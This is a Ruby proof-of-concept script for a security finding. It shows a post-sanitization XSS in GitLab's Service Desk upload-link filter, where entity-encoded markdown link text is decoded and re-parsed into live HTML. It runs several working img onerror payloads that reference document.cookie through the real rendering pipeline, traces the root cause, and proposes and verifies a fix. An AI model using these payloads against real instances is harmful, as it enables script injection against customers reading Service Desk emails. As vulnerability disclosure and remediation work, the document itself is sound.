#!/usr/bin/env ruby
# frozen_string_literal: true

# =============================================================================
# PoC: Finding #4 — ServiceDeskUploadLinkFilter Post-Sanitization XSS
# =============================================================================
#
# VULNERABILITY:
#   lib/banzai/filter/service_desk_upload_link_filter.rb lines 31-38
#
#   The filter extracts link text via Nokogiri's `.text` (which decodes HTML
#   entities back to raw characters) and interpolates it into an HTML string
#   passed to Nokogiri::HTML::DocumentFragment.parse(). This re-introduces
#   raw HTML *after* SanitizationFilter (index 7) has already run — the
#   vulnerable filter is at index 46 in the pipeline.
#
# ATTACK VECTOR:
#   An attacker writes a markdown link with HTML entities in the link text:
#     [&lt;img src=x onerror=alert(1)&gt;](/uploads/SECRET/file.txt)
#
#   The entities are harmless text through sanitization. But `.text` decodes
#   them, and the re-interpolation creates a real <img> with onerror handler.
#
# WHO CAN EXPLOIT:
#   Any project member (Reporter+) commenting on a Service Desk issue.
#   The victim is the external email participant (customer).
#
# USAGE:
#   cd /home/user/gitlab-source
#   RBENV_VERSION=3.3.6 /opt/rbenv/versions/3.3.6/bin/ruby bin/rails runner \
#     /home/user/testaa/poc_finding4_xss.rb
#
# PREREQUISITES:
#   - Local GitLab instance with PostgreSQL running and at least one project
# =============================================================================

require 'cgi'

puts "=" * 72
puts "PoC: ServiceDeskUploadLinkFilter Post-Sanitization XSS (Finding #4)"
puts "=" * 72
puts

# ---------------------------------------------------------------------------
# STEP 1: Set up a project and create a real upload
# ---------------------------------------------------------------------------
puts "[*] Step 1: Setting up project and upload..."

project = Project.first
abort "ERROR: No projects found. Create a project first." unless project
puts "    Project: #{project.full_path} (id=#{project.id})"

# Create a real file upload so uploads_as_attachments check passes
tmpfile = Tempfile.new(['poc_upload', '.txt'])
tmpfile.write("harmless file content")
tmpfile.rewind

uploader = UploadService.new(
  project,
  { tempfile: tmpfile, filename: 'report.txt', content_type: 'text/plain' },
  FileUploader
).execute
abort "ERROR: Upload failed" unless uploader

secret = uploader.secret
filename = uploader.filename
upload_path = "/uploads/#{secret}/#{filename}"
attachment_key = "#{secret}/#{filename}"

puts "    Upload path: #{upload_path}"
puts "    Attachment key: #{attachment_key}"
puts

# ---------------------------------------------------------------------------
# STEP 2: Show the pipeline context
# ---------------------------------------------------------------------------
puts "[*] Step 2: Pipeline analysis..."
pipeline = Banzai::Pipeline::ServiceDeskEmailPipeline
filters = pipeline.filters.map(&:name)
san_idx = filters.index("Banzai::Filter::SanitizationFilter")
vuln_idx = filters.index("Banzai::Filter::ServiceDeskUploadLinkFilter")
puts "    SanitizationFilter:            index #{san_idx}"
puts "    ServiceDeskUploadLinkFilter:   index #{vuln_idx}"
puts "    Filters between them:          #{vuln_idx - san_idx - 1}"
puts "    => Vulnerable filter runs AFTER sanitization (no re-sanitization)"
puts

# ---------------------------------------------------------------------------
# STEP 3: Test XSS payloads through the FULL Banzai pipeline
# ---------------------------------------------------------------------------
puts "[*] Step 3: Testing payloads through real Banzai ServiceDeskEmailPipeline..."
puts "    (This is the exact pipeline used by the Service Desk mailer)"
puts

context = {
  project: project,
  pipeline: :service_desk_email,
  uploads_as_attachments: [attachment_key],
}

# These payloads use HTML entities / escapes in markdown link text.
# The entities survive SanitizationFilter as harmless text, then get
# decoded by .text and re-injected as real HTML.
payloads = [
  {
    name: "HTML entities — &lt;img onerror&gt; (cookie theft)",
    markdown: "[&lt;img src=x onerror=alert(document.cookie)&gt;](#{upload_path})",
  },
  {
    name: "Numeric entities — &#60;img onerror&#62;",
    markdown: "[&#60;img src=x onerror=alert(document.cookie)&#62;](#{upload_path})",
  },
  {
    name: "Backslash-escaped angle brackets",
    markdown: "[\\<img src=x onerror=alert(document.cookie)\\>](#{upload_path})",
  },
  {
    name: "Code span preserving entities",
    markdown: "[`<img src=x onerror=alert(document.cookie)>`](#{upload_path})",
  },
  {
    name: "Bold + entities (nested formatting)",
    markdown: "[**&lt;img src=x onerror=alert(1)&gt;**](#{upload_path})",
  },
  {
    name: "Nested <em> with entities inside",
    markdown: "[<em>&lt;img src=x onerror=alert(1)&gt;</em>](#{upload_path})",
  },
]

xss_count = 0

payloads.each_with_index do |payload, idx|
  puts "-" * 72
  puts "Payload #{idx + 1}: #{payload[:name]}"
  puts "-" * 72
  puts "  Markdown: #{payload[:markdown]}"

  result = Banzai.render(payload[:markdown], context)
  puts "  Output:   #{result.strip}"

  doc = Nokogiri::HTML::DocumentFragment.parse(result)
  has_strong = doc.at_css('strong')
  has_link = doc.at_css('a')

  if has_strong && !has_link
    # Filter activated — check for XSS in the output
    event_handlers = []
    dangerous_els = []
    doc.traverse do |node|
      next unless node.element?
      dangerous_els << node.name if %w[img svg script iframe object embed form].include?(node.name)
      node.attributes.each do |attr_name, attr|
        event_handlers << "#{node.name}[#{attr_name}]=\"#{attr.value}\"" if attr_name.start_with?('on')
      end
    end

    if event_handlers.any?
      xss_count += 1
      puts "  Result:   *** XSS CONFIRMED — JavaScript executes in victim's email client ***"
      event_handlers.each { |eh| puts "            Event handler: #{eh}" }
    elsif dangerous_els.any?
      xss_count += 1
      puts "  Result:   *** HTML INJECTION — dangerous element injected: #{dangerous_els.join(', ')} ***"
    else
      puts "  Result:   Filter activated, no dangerous content detected"
    end
  elsif has_link
    puts "  Result:   Filter did NOT activate"
  else
    puts "  Result:   Unexpected output"
  end
  puts
end

puts "=" * 72
puts "RESULTS: #{xss_count}/#{payloads.size} payloads achieved XSS/HTML injection"
puts "=" * 72
puts

# ---------------------------------------------------------------------------
# STEP 4: Trace the exact vulnerability mechanism
# ---------------------------------------------------------------------------
puts "[*] Step 4: Tracing the vulnerability mechanism step-by-step..."
puts

test_md = "[&lt;img src=x onerror=alert(document.cookie)&gt;](#{upload_path})"
puts "  Input markdown:"
puts "    #{test_md}"
puts

# Simulate the intermediate HTML as Comrak would produce it.
# Comrak entity-encodes < and > in link text, producing safe HTML:
intermediate_html = '<p><a href="' + upload_path + '">&lt;img src=x onerror=alert(document.cookie)&gt;</a></p>'
puts "  After MarkdownFilter (Comrak, unsafe:true):"
puts "    #{intermediate_html}"
puts "    Note: &lt; and &gt; are entity-encoded text inside the <a> tag"
puts

puts "  After SanitizationFilter:"
puts "    #{intermediate_html}"
puts "    Note: Nothing to strip — the entities are harmless text content"
puts

# Step C: ServiceDeskUploadLinkFilter — the vulnerability
puts "  Inside ServiceDeskUploadLinkFilter (the vulnerable code):"
# Simulate what the filter does on lines 30-38:
a_tag = Nokogiri::HTML::DocumentFragment.parse(intermediate_html).at_css('a')
if a_tag
  text_content = a_tag.text
  puts "    Line 31: parent.text returns: #{text_content.inspect}"
  puts "    Note: .text DECODED the entities — &lt; became <, &gt; became >"
  puts
  final_filename = "#{text_content} (#{filename})"
  puts "    Line 33: final_filename = \"\#{filename_in_text} (\#{filename_in_link})\""
  puts "    Value:   #{final_filename.inspect}"
  puts
  puts "    Line 38: Nokogiri::HTML::DocumentFragment.parse(\"<strong>\#{final_filename}</strong>\")"
  interpolated = "<strong>#{final_filename}</strong>"
  puts "    String:  #{interpolated.inspect}"
  puts
  final_element = Nokogiri::HTML::DocumentFragment.parse(interpolated)
  puts "    Parsed:  #{final_element.to_html}"
  puts

  img = final_element.at_css('img')
  if img&.attr('onerror')
    puts "    *** <img> element created with onerror=\"#{img.attr('onerror')}\" ***"
    puts "    *** This JavaScript executes when the email renders in the victim's client ***"
  end
end
puts

# ---------------------------------------------------------------------------
# STEP 5: Root cause and fix
# ---------------------------------------------------------------------------
puts "=" * 72
puts "ROOT CAUSE"
puts "=" * 72
puts
puts "File: lib/banzai/filter/service_desk_upload_link_filter.rb"
puts
puts "Line 31:  filename_in_text = parent.text"
puts "  -> Nokogiri .text decodes HTML entities: &lt; -> <, &gt; -> >"
puts
puts "Line 38:  Nokogiri::HTML::DocumentFragment.parse(\"<strong>\#{final_filename}</strong>\")"
puts "  -> Decoded < and > are parsed as real HTML tags"
puts "  -> Creates <img onerror=...> as a live DOM element"
puts "  -> No sanitization runs after this point in the pipeline"
puts

puts "=" * 72
puts "SUGGESTED FIX"
puts "=" * 72
puts
puts "Replace lines 38-39 with safe DOM construction:"
puts
puts '  # BEFORE (vulnerable):'
puts '  final_element = Nokogiri::HTML::DocumentFragment.parse('
puts '    "<strong>#{final_filename}</strong>"'
puts '  )'
puts '  parent.replace(final_element)'
puts
puts '  # AFTER (safe — .content= auto-encodes entities):'
puts '  strong = Nokogiri::XML::Node.new("strong", doc)'
puts '  strong.content = final_filename'
puts '  parent.replace(strong)'
puts

# ---------------------------------------------------------------------------
# STEP 6: Verify the fix
# ---------------------------------------------------------------------------
puts "=" * 72
puts "FIX VERIFICATION"
puts "=" * 72
puts

xss_text = '<img src=x onerror=alert(document.cookie)>'

puts "Vulnerable code (current):"
vuln = Nokogiri::HTML::DocumentFragment.parse("<strong>#{xss_text}</strong>")
puts "  HTML: #{vuln.to_html}"
vuln_img = vuln.at_css('img')
puts "  onerror present: #{vuln_img&.attr('onerror') ? 'YES — XSS!' : 'no'}"
puts

puts "Fixed code (using .content=):"
doc_fix = Nokogiri::HTML::DocumentFragment.parse("")
strong = Nokogiri::XML::Node.new('strong', doc_fix)
strong.content = "#{xss_text} (#{filename})"
puts "  HTML: #{strong.to_html}"
puts "  onerror present: #{Nokogiri::HTML::DocumentFragment.parse(strong.to_html).at_css('img') ? 'YES' : 'no — safe'}"
puts

# Cleanup
tmpfile.close
tmpfile.unlink

puts "=" * 72
puts "PoC complete. All rendering through real Banzai ServiceDeskEmailPipeline."
puts "=" * 72
